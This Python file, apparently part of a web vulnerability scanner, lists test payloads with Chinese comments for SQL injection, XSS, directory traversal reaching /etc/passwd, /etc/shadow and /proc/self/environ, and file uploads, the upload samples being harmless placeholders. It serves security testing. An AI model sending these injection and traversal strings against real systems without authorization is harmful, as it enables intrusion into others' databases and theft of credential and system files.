# payloads.py
# 载荷列表

# SQL注入有效载荷
SQL_INJECTION_PAYLOADS = {
    "basic": [
        # 用于检测基础 SQL 注入
        "' OR '1'='1' --",                             # 始终返回真，验证漏洞存在
        "' OR '1'='1' #",                               # 注释掉后面的查询，验证响应
        "'; SELECT 1 --",                               # 验证注入是否成功
    ],
    "union_based": [
        # 用于检测联合查询漏洞
        "' UNION SELECT NULL, NULL --",                # 测试联合查询基本功能
        "' UNION SELECT 'Test', NULL --",              # 简单的联合查询示例
        "' UNION SELECT database(), NULL --",          # 获取当前数据库名
    ],
    "blind": [
        # 盲注有效载荷用于检测
        "' AND (SELECT 1 FROM dual) --",               # 测试条件是否返回真
        "' AND (SELECT COUNT(*) FROM users) > 0 --",   # 检查用户表是否存在
    ],
    "error_based": [
        # 基于错误消息的测试
        "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM users)) --",  # 测试用户数量
        "'; SELECT @@version --",                     # 查询数据库版本信息，验证响应
    ],
    "advanced": [
        # 复杂查询的有效载荷，用于检测高级注入
        "' AND EXISTS (SELECT * FROM users) --",      # 检查用户表是否存在
        "' AND 1 ORDER BY 1 --",                        # 测试排序，检查可能的错误
    ],
    "error_injection": [
        # 用于测试错误处理的有效载荷
        "' AND 1=1 --",                                 # 确认任意条件的正常响应
        "' AND (SELECT COUNT(*) FROM non_existing_table) > 0 --"  # 测试针对不存在的表的错误处理
    ]
}


# XSS有效载荷
XSS_PAYLOADS = {
    "reflected": [  # 反射型 XSS
        "<script>alert('Reflected XSS')</script>",              # 基本反射型 XSS
        "'><img src=x onerror='alert(1)'>",                    # 图像错误触发
        "<svg onload='alert(2)'>",                              # SVG 注入触发 XSS
        "<body onload='alert(3)'>",                             # 页面加载时执行 JavaScript
    ],
    "stored": [  # 存储型 XSS
        "<script>alert('Stored XSS')</script>",                  # 简化的存储型 XSS
        "<input type='text' value='<script>alert(4)'></input>",  # 基本表单注入 XSS
        "<a href='#' onclick='alert(5)'>Click Me</a>",         # 安全的点击事件
    ],
    "dom_based": [  # DOM型 XSS
        "javascript:alert('DOM-based XSS')",                    # 使用 javascript 伪协议
        "<button onclick='alert(\"Button XSS\")'>Click me</button>",  # 按钮点击事件
    ],
    "event_based": [  # 事件驱动型 XSS
        "<a href='#' onclick='alert(\"XSS via Link Click\")'>Click me</a>", # 通过链接触发
        '<div onmouseover="alert(\'Mouseover XSS\')">Hover over me!</div>', # 鼠标悬停事件
    ],
    "encoded": [  # URL 编码 XSS
        "%3Cscript%3Ealert%28%27Encoded%20XSS%27%29%3C%2Fscript%3E", # URL 编码的 XSS
    ],
}


# 目录遍历有效载荷
DIRECTORY_TRAVERSAL_PAYLOADS = [
    # 基本和经典的目录遍历
    "../../etc/passwd",                                          # 访问 Unix 密码文件，保留以检测是否有漏洞
    "/etc/passwd",                                             # 常见的服务器配置文件
    "/var/www/html/index.html",                               # Web 根目录中的文件

    # URL 编码的示例
    "..%2F..%2F..%2Fetc%2Fpasswd",                           # URL 编码目录遍历
    "%2E%2E%2F%2E%2E%2Fetc%2Fshadow",                        # URL 编码的 shadow 文件访问

    # 深度遍历和复杂路径
    "../..//..//..//var/log/apache2/access.log",            # 测试访问 Apache 访问日志
    "/proc/self/environ",                                     # 访问当前进程的环境变量，安全性较低但可用于测试

    # 针对不同系统的路径
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\Program Files\\malicious.exe", # Windows深度路径，保留测试路径，虽然名称需改成安全名称
]




# 文件上传有效载荷
FILE_UPLOAD_PAYLOADS = {
    "php_payloads": [  # PHP 脚本有效载荷
        ('malicious.php', '<?php echo "This is a safe test PHP file."; ?>', 'application/php'),  # 安全测试 PHP 文件
        # 移除潜在危险的有效载荷，如执行系统命令的示例
    ],

    "javascript_payloads": [  # JavaScript 文件
        ('malicious.js', 'console.log("Testing JavaScript upload.");', 'application/javascript'),  # 安全的 JavaScript 文件
    ],

    "html_payloads": [  # HTML 文件
        ('malicious.html', '<p>This is a safe HTML test file.</p>', 'text/html'),  # 安全的 HTML 文件
    ],

    "common_documents": [  # 常规文档类型
        ('malicious.txt', 'This is a test text file.', 'text/plain'),  # 安全的文本文件内容
        ('malicious.pdf', 'This PDF contains no scripts.', 'application/pdf'),  # 安全的 PDF 文件
        # 移除可能包含恶意宏的 Word 或 Excel 文件
    ],

    "image_payloads": [  # 图像文件
        ('test_image.gif', 'GIF89a...', 'image/gif'),  # 安全的 GIF
        ('test_image.png', 'PNG data', 'image/png'),    # 安全的 PNG，不含脚本
    ],

    "executable_payloads": [  # 可执行文件
        # 移除所有可执行文件有效载荷，因其潜在风险
    ]
}



